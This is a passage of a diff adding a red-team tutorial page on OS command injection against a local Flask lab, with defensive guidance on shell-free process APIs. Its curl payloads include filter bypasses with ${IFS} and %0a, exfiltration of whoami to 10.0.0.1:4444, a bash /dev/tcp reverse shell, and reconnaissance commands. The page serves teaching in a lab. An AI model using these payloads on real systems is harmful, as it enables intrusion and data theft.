+# Output: contents of /etc/passwd
+
+curl -s -X POST http://localhost:5000/ping \
+  --data-urlencode &#39;host=8.8.8.8; ls -la /var/www/&#39;
+# Output: directory listing
+
+# Exploitation of Level 2 (filtered — spaces and ; stripped):
+# Bypass with $IFS and %0a
+curl -s -X POST http://localhost:5000/ping-filtered \
+  --data-urlencode &#39;host=8.8.8.8%0aid&#39;
+# %0a passes through (not ;) → newline → command separator
+
+curl -s -X POST http://localhost:5000/ping-filtered \
+  --data-urlencode &#39;host=8.8.8.8${IFS}||${IFS}id&#39;
+# ${IFS} substitutes for spaces
+
+curl -s -X POST http://localhost:5000/ping-filtered \
+  --data-urlencode &#39;host=8.8.8.8%0acat${IFS}/etc/passwd&#39;
+
+# Exploitation of Level 3 (blind — no output):
+# Start listener first: ncat -lvnp 4444
+curl -s -X POST http://localhost:5000/ping-blind \
+  --data-urlencode &#39;host=8.8.8.8; curl http://10.0.0.1:4444/$(whoami | base64)&#39;
+# Or:
+curl -s -X POST http://localhost:5000/ping-blind \
+  --data-urlencode &#39;host=8.8.8.8; bash -c &#34;exec bash -i &amp;&gt;/dev/tcp/10.0.0.1/4444 &lt;&amp;1&#34;&#39;
+						</pre>
+					</section>
+					<section>
+						<h3 id="safe-api-alternatives">Safe API Alternatives</h3>
+						<p>
+							The defense is simple: never pass user data to a shell. Use the programming language's direct
+							process execution
+							<abbr title="Application Programming Interface">API</abbr>
+							with argument arrays.
+						</p>
+						<pre class="python">
+# VULNERABLE — shell=True or string command
+subprocess.run(f&#34;ping -c 4 {host}&#34;, shell=True)   # SHELL INVOLVED → VULNERABLE
+subprocess.getoutput(f&#34;ping -c 4 {host}&#34;)          # SHELL INVOLVED → VULNERABLE
+os.system(f&#34;ping -c 4 {host}&#34;)                      # SHELL INVOLVED → VULNERABLE
+
+# SAFE — argument list, no shell
+subprocess.run([&#34;ping&#34;, &#34;-c&#34;, &#34;4&#34;, host], shell=False, capture_output=True)
+# host is always one argument to ping. Even if host = &#34;8.8.8.8; id&#34;,
+# ping receives it as a literal string, not as shell syntax.
+
+# SAFE — legacy os module with exec
+pid = os.fork()
+if pid == 0:
+    os.execvp(&#34;ping&#34;, [&#34;ping&#34;, &#34;-c&#34;, &#34;4&#34;, host])
+
+# SAFE — C
+execlp(&#34;ping&#34;, &#34;ping&#34;, &#34;-c&#34;, &#34;4&#34;, host, (char*)NULL);
+// or: execvp(&#34;ping&#34;, argv_array);
+// NEVER: system(command_string);
+						</pre>
+					</section>
+					<section>
+						<h3 id="verification-commands">Verification Commands</h3>
+						<p>After discovering command injection, verify the environment before proceeding to exploitation:</p>
+						<pre class="bash">
+# What user are we?
+; id
+; whoami
+
+# What OS and kernel?
+; uname -a
+; cat /etc/os-release
+
+# What shell is available?
+; which bash sh ash dash zsh
+
+# What utilities are available?
+; which nc ncat curl wget python python3 php perl ruby
+; ls /bin /usr/bin | head -50
+
+# Network configuration
+; ip addr show
+; ip route show
+; cat /etc/resolv.conf
+
+# What processes are running? (might reveal AV/EDR)
+; ps aux
+
+# Any firewalls?
+; iptables -L -n 2&gt;/dev/null || ufw status 2&gt;/dev/null || firewall-cmd --list-all 2&gt;/dev/null
+
+# Write permissions test
+; touch /tmp/test_write &amp;&amp; echo writable || echo not_writable
+; touch /var/www/html/test_write &amp;&amp; echo writable || echo not_writable
+						</pre>
+					</section>
+					<section>
+						<h3 id="common-mistakes">Common Mistakes</h3>
+						<ol>
+							<li><b>Using 'subprocess.run()' with 'shell=True'.</b> The flag is named correctly - it invokes the shell. Even if you pass a list, <code>shell=True</code> concatenates it into a string and passes to <code>sh -c</code> .</li>
+							<li><b>Assuming 'exec()' in PHP/Ruby/Perl is safe.</b> In these languages, <code>exec()</code> invokes the shell by default. Use the multi-argument form.</li>
+							<li><b>Filtering is not sanitization.</b> Blacklists of characters are always bypassable. The shell has too many encoding options.</li>
+							<li><b>Not URL-encoding properly.</b> The <code>--data-urlencode</code> flag in curl handles encoding; <code>--data</code> does not. Always verify what bytes are actually being sent.</li>
+							<li><b>Forgetting that 'Runtime.exec(String)' in Java tokenizes on whitespace.</b> The command <code>&#34;ls -la&#34;</code> becomes <code>[&#34;ls&#34;, &#34;-la&#34;]</code> - splitting breaks. Use <code>ProcessBuilder</code> with a <code>List&lt;String&gt;</code> .</li>
+						</ol>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							The container runs a Flask network diagnostic tool at three filter levels (unfiltered, filtered,
+							and blind) plus an image converter and a cron scheduler with injectable parameters. Read
+							<code>/etc/passwd</code>
+							through the filtered endpoint, then pop a reverse shell from the blind endpoint.
+						</p>
+						<p><a href="/wiki/articles/redteam/command-injection.Containerfile">command-injection.Containerfile</a></p>
+						<pre class="bash">
+podman build -t cmd-inj-lab -f command-injection.Containerfile .
+podman run -d --name cmd-inj-lab -p 8080:80 cmd-inj-lab
+						</pre>
+						<p>Endpoints:</p>
+						<ul>
+							<li><code>http://localhost:8080/</code> - main page listing all levels</li>
+							<li><code>http://localhost:8080/ping</code> - level 1: no filter</li>
+							<li><code>http://localhost:8080/ping-filtered</code> - level 2: space and semicolon filter</li>
+							<li><code>http://localhost:8080/ping-blind</code> - level 3: blind, no output</li>
+							<li><code>http://localhost:8080/convert</code> - image converter with filename injection</li>
+							<li><code>http://localhost:8080/scheduler</code> - cron expression injection</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://owasp.org/www-community/attacks/Command_Injection" target="_blank">OWASP - Command Injection</a> - overview and defensive guidance</li>
+							<li><a class="icon-website" href="https://cwe.mitre.org/data/definitions/78.html" target="_blank">CWE-78 - OS Command Injection</a> - weakness definition and examples</li>
+							<li><a class="icon-website" href="https://portswigger.net/web-security/os-command-injection" target="_blank">PortSwigger - OS Command Injection</a> - labs and filter bypass notes</li>
+							<li><a class="icon-website" href="https://pubs.opengroup.org/onlinepubs/9699919799/utilities/sh.html" target="_blank">POSIX sh</a> - the shell grammar that makes injection possible</li>
+							<li><a class="icon-website" href="https://pkg.go.dev/os/exec" target="_blank">Go os/exec</a> - the shell-free process <abbr title="Application Programming Interface">API</abbr> for Go</li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
